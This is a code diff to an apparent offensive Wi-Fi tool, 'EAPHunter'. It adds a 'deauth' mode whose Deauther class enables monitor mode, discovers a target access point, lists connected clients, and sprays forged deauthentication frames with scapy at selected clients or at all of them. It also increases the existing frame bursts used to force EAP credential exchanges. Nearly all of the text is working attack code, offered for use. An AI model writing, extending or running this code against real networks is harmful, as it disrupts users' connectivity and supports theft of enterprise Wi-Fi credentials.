@@ -996,6 +996,7 @@ class EAPHunter:
 
         bar = "=" * 62
         rows = []
+        rows.append(f"")
         rows.append(f"  {bar}")
         rows.append(f"  EAPHunter  |  {self.essid}  |  {self.bssid}  |  ch {self.channel}  |  {ts}")
         rows.append(f"  {bar}")
@@ -1026,8 +1027,9 @@ class EAPHunter:
         prompt = f"  [?] Select [1-{n_clients}], 'auto', or 'q': " if n_clients else \
                  "  [?] Waiting for clients … ('q' to quit): "
         print(prompt, end="", flush=True)
+        print()   # blank line after prompt so next output doesn't run into it
 
-        return len(rows)   # prompt sits on the last line, no extra newline
+        return len(rows) + 1   # +1 for the prompt+newline line
 
     # ── Deauth + Capture (sniff starts BEFORE deauth is sent) ────────────────
 
@@ -1073,7 +1075,7 @@ class EAPHunter:
             pkt = (_sc.RadioTap() /
                    _sc.Dot11(addr1=dst, addr2=src, addr3=self.bssid, type=0, subtype=12) /
                    _sc.Dot11Deauth(reason=7))
-            _sc.sendp(pkt, iface=self.iface, count=10, inter=0.1, verbose=False)
+            _sc.sendp(pkt, iface=self.iface, count=64, inter=0.05, verbose=False)
         ok("Deauth frames sent — waiting for EAP exchange …")
 
         done = threading.Event()
@@ -1183,7 +1185,10 @@ class EAPHunter:
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
 def _sorted_clients(table: dict) -> list[dict]:
-    return sorted(table.values(), key=lambda c: c["last_seen"], reverse=True)
+    # Sort by first_seen ascending — order is stable, new clients append at bottom.
+    # Never re-order existing entries so a queued number always hits the right client.
+    return sorted(table.values(), key=lambda c: c["first_seen"])
+
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1349,6 +1354,272 @@ class EAPSprayer:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+class Deauther:
+    """
+    Continuous client monitor + targeted deauth. No EAP capture.
+    Uses the same live table and selection dialogue as userenum.
+    """
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    def __init__(self, essid: str | None, bssid: str | None,
+                 channel: int | None, iface: str):
+        self.essid    = essid
+        self.bssid    = bssid or ""
+        self.channel  = channel or 0
+        self.iface    = iface
+        self._client_table: dict[str, dict] = {}
+        self._client_lock   = threading.Lock()
+
+    # ── Entry point ──────────────────────────────────────────────────────────
+
+    def run(self):
+        try:
+            _require_scapy()
+            self._enable_monitor()
+            if not self.bssid:
+                self._discover_ap()
+            else:
+                self._set_channel(self.channel)
+            self._monitor_loop()
+        except KeyboardInterrupt:
+            print("\n\n  [!] Interrupted.")
+        finally:
+            self._restore_managed()
+
+    # ── Monitor mode ─────────────────────────────────────────────────────────
+
+    def _enable_monitor(self):
+        section("Monitor Mode")
+        info("Killing interfering processes …")
+        _kill_interfering()
+        info(f"Setting {self.iface} to monitor mode …")
+        for cmd in (["ip", "link", "set", self.iface, "down"],
+                    ["iw", "dev",  self.iface, "set", "type", "monitor"],
+                    ["ip", "link", "set", self.iface, "up"]):
+            r = subprocess.run(cmd, capture_output=True)
+            if r.returncode != 0:
+                die(f"Command failed: {' '.join(cmd)}")
+        ok(f"Monitor mode active on {self.iface}")
+
+    def _restore_managed(self):
+        for cmd in (["ip", "link", "set", self.iface, "down"],
+                    ["iw", "dev",  self.iface, "set", "type", "managed"],
+                    ["ip", "link", "set", self.iface, "up"]):
+            subprocess.run(cmd, capture_output=True)
+
+    def _set_channel(self, ch: int):
+        subprocess.run(["iw", "dev", self.iface, "set", "channel", str(ch)],
+                       capture_output=True)
+
+    def _hop_channels(self, stop: threading.Event, current: dict):
+        while not stop.is_set():
+            for ch in CHANNELS:
+                if stop.is_set():
+                    return
+                r = subprocess.run(["iw", "dev", self.iface, "set", "channel", str(ch)],
+                                   capture_output=True)
+                if r.returncode == 0:
+                    current["ch"] = ch
+                time.sleep(0.25)
+
+    # ── AP discovery ─────────────────────────────────────────────────────────
+
+    def _discover_ap(self):
+        section("AP Discovery")
+        found, current = {}, {"ch": 1}
+        stop_hop = threading.Event()
+
+        def handle(pkt):
+            if not (pkt.haslayer(_sc.Dot11Beacon) or pkt.haslayer(_sc.Dot11ProbeResp)):
+                return
+            bssid = pkt[_sc.Dot11].addr3 or pkt[_sc.Dot11].addr2
+            essid_bytes, ds_ch = b"", 0
+            elt = pkt[_sc.Dot11Elt] if pkt.haslayer(_sc.Dot11Elt) else None
+            while isinstance(elt, _sc.Dot11Elt):
+                if elt.ID == 0:
+                    essid_bytes = elt.info
+                elif elt.ID == 3 and elt.info:
+                    ds_ch = elt.info[0]
+                elt = elt.payload
+            try:
+                essid = essid_bytes.decode(errors="replace")
+            except Exception:
+                return
+            if essid == self.essid and not found:
+                found["bssid"] = bssid
+                found["channel"] = ds_ch or current["ch"]
+
+        hop = threading.Thread(target=self._hop_channels, args=(stop_hop, current),
+                               daemon=True)
+        hop.start()
+        info(f"Scanning for '{self.essid}' …")
+        _sc.sniff(iface=self.iface, prn=handle,
+                  stop_filter=lambda _: bool(found), timeout=60, store=False)
+        stop_hop.set()
+
+        if not found:
+            die(f"'{self.essid}' not found.")
+        self.bssid   = found["bssid"]
+        self.channel = found["channel"]
+        ok(f"SSID    : {self.essid}")
+        ok(f"BSSID   : {self.bssid}")
+        ok(f"Channel : {self.channel}")
+        self._set_channel(self.channel)
+
+    # ── Frame handler (client detection) ─────────────────────────────────────
+
+    def _handle_frame(self, pkt):
+        if not pkt.haslayer(_sc.Dot11):
+            return
+        dot11 = pkt[_sc.Dot11]
+        if dot11.type != 2:
+            return
+        fc      = int(dot11.FCfield)
+        to_ds   = bool(fc & 0x01)
+        from_ds = bool(fc & 0x02)
+        if to_ds and not from_ds:
+            client_mac, ap_mac = dot11.addr2, dot11.addr1
+        elif from_ds and not to_ds:
+            client_mac, ap_mac = dot11.addr1, dot11.addr2
+        else:
+            return
+        if not ap_mac or ap_mac.lower() != self.bssid.lower():
+            return
+        if not client_mac or not re.match(r"^[0-9a-f:]{17}$", client_mac.lower()):
+            return
+        if client_mac.lower() in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
+            return
+        rssi = ""
+        try:
+            rt = pkt.getlayer(_sc.RadioTap)
+            if rt and hasattr(rt, "dBm_AntSignal"):
+                rssi = str(rt.dBm_AntSignal)
+        except Exception:
+            pass
+        with self._client_lock:
+            entry = self._client_table.setdefault(client_mac, {
+                "mac": client_mac, "power": rssi,
+                "packets": 0, "deauthed": False,
+                "first_seen": time.time(), "last_seen": time.time(),
+            })
+            entry["packets"]  += 1
+            entry["last_seen"] = time.time()
+            if rssi:
+                entry["power"] = rssi
+
+    # ── Client table ─────────────────────────────────────────────────────────
+
+    def _print_client_table(self) -> int:
+        ts = time.strftime("%H:%M:%S")
+        with self._client_lock:
+            clients = _sorted_clients(self._client_table)
+        label = self.essid or self.bssid
+        rows = [
+            f"",
+            f"  -- {label}  [{self.bssid}  ch {self.channel}]  [{ts}]",
+        ]
+        if not clients:
+            rows.append("  [*] No clients observed …")
+        else:
+            rows.append(
+                f"  {'#':<5}  {'MAC ADDRESS':<20}  {'PWR':>5}  {'PKTS':>6}"
+                f"  {'VENDOR':<25}  STATUS"
+            )
+            rows.append(f"  {'─'*5}  {'─'*20}  {'─'*5}  {'─'*6}  {'─'*25}  {'─'*10}")
+            for i, c in enumerate(clients, 1):
+                vendor = _vendor(c["mac"])[:25]
+                pwr    = c["power"] or "?"
+                status = "[deauthed]" if c["deauthed"] else ""
+                rows.append(
+                    f"  [{i}]    {c['mac']:<20}  {pwr:>5}  {c['packets']:>6}"
+                    f"  {vendor:<25}  {status}"
+                )
+        rows.append("")
+        for row in rows:
+            print(row)
+        n = len(clients)
+        prompt = (f"  [?] Select [1-{n}], 'auto', or 'q': " if n
+                  else "  [?] Waiting for clients … ('q' to quit): ")
+        print(prompt, end="", flush=True)
+        print()   # blank line after prompt
+        return len(rows) + 1
+
+    # ── Deauth ───────────────────────────────────────────────────────────────
+
+    def _send_deauth(self, target_mac: str):
+        warn(f"Deauthing {target_mac}  (AP: {self.bssid})")
+        for src, dst in [(self.bssid, target_mac), (target_mac, self.bssid)]:
+            pkt = (_sc.RadioTap() /
+                   _sc.Dot11(addr1=dst, addr2=src, addr3=self.bssid,
+                              type=0, subtype=12) /
+                   _sc.Dot11Deauth(reason=7))
+            _sc.sendp(pkt, iface=self.iface, count=64, inter=0.05, verbose=False)
+        ok("Done.")
+
+    # ── Main loop ─────────────────────────────────────────────────────────────
+
+    def _monitor_loop(self):
+        stop_sniff = threading.Event()
+
+        def sniff_loop():
+            while not stop_sniff.is_set():
+                _sc.sniff(iface=self.iface, prn=self._handle_frame,
+                          timeout=SNIFF_SLICE, store=False)
+
+        sniff_thread = threading.Thread(target=sniff_loop, daemon=True)
+        sniff_thread.start()
+
+        prev_lines = 0
+        try:
+            while True:
+                if prev_lines > 0:
+                    print(f"\033[{prev_lines}A\r\033[J", end="", flush=True)
+                prev_lines = self._print_client_table()
+
+                ready, _, _ = _select.select([sys.stdin], [], [], 3.0)
+                if not ready:
+                    continue
+
+                line = sys.stdin.readline().strip()
+                prev_lines = 0
+
+                if line.lower() in ("q", "quit", "exit"):
+                    break
+
+                with self._client_lock:
+                    clients = _sorted_clients(self._client_table)
+
+                if line.lower() == "auto":
+                    undeauthed = [c for c in clients if not c["deauthed"]]
+                    if not undeauthed:
+                        warn("No undeauthed clients remaining.")
+                        continue
+                    import random
+                    random.shuffle(undeauthed)
+                    for entry in undeauthed:
+                        self._send_deauth(entry["mac"])
+                        with self._client_lock:
+                            if entry["mac"] in self._client_table:
+                                self._client_table[entry["mac"]]["deauthed"] = True
+                    continue
+
+                if not line.isdigit():
+                    continue
+                idx = int(line)
+                if not (1 <= idx <= len(clients)):
+                    continue
+
+                target = clients[idx - 1]["mac"]
+                self._send_deauth(target)
+                with self._client_lock:
+                    if target in self._client_table:
+                        self._client_table[target]["deauthed"] = True
+
+        finally:
+            stop_sniff.set()
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _load_lines(path: str) -> list[str]:
     return [l.strip() for l in Path(path).read_text().splitlines()
             if l.strip() and not l.startswith("#")]
@@ -1385,13 +1656,23 @@ def main():
                     help="Seconds between attempts (default: 0)")
     sp.add_argument("-o", "--output",    default=None, help="Output directory")
 
+    # ── deauth ────────────────────────────────────────────────────────────────
+    da = sub.add_parser("deauth",
+                        help="Monitor clients and deauthenticate on demand")
+    da.add_argument("-e", "--essid",     default=None, help="Target SSID (scans to resolve BSSID/channel)")
+    da.add_argument("-i", "--interface", required=True, help="Wireless interface")
+    da.add_argument("--bssid",           default=None, help="Target BSSID (skip scan if provided)")
+    da.add_argument("-c", "--channel",   type=int, default=None,
+                    help="Channel (required when --bssid is used)")
+
     args = ap.parse_args()
 
     if os.geteuid() != 0:
         die(f"Must run as root.  Try: sudo python3 {sys.argv[0]} {' '.join(sys.argv[1:])}")
 
     ts      = time.strftime("%Y%m%d_%H%M%S")
-    out_dir = args.output or f"./eaphunter_{args.essid.replace(' ', '_')}_{ts}"
+    essid_slug = getattr(args, "essid", None) or "session"
+    out_dir = getattr(args, "output", None) or f"./eaphunter_{essid_slug.replace(' ', '_')}_{ts}"
     Path(out_dir).mkdir(parents=True, exist_ok=True)
 
     if args.mode == "userenum":
@@ -1428,6 +1709,18 @@ def main():
         signal.signal(signal.SIGINT,  lambda _s, _f: sys.exit(0))
         signal.signal(signal.SIGTERM, lambda _s, _f: sys.exit(0))
         sprayer.run()
+
+    elif args.mode == "deauth":
+        if not args.essid and not args.bssid:
+            die("Provide --essid or --bssid")
+        if args.bssid and not args.channel:
+            die("--channel required when --bssid is specified")
+
+        da = Deauther(essid=args.essid, bssid=args.bssid,
+                      channel=args.channel, iface=args.interface)
+        signal.signal(signal.SIGINT,  lambda _s, _f: sys.exit(0))
+        signal.signal(signal.SIGTERM, lambda _s, _f: sys.exit(0))
+        da.run()
 
 
 if __name__ == "__main__":
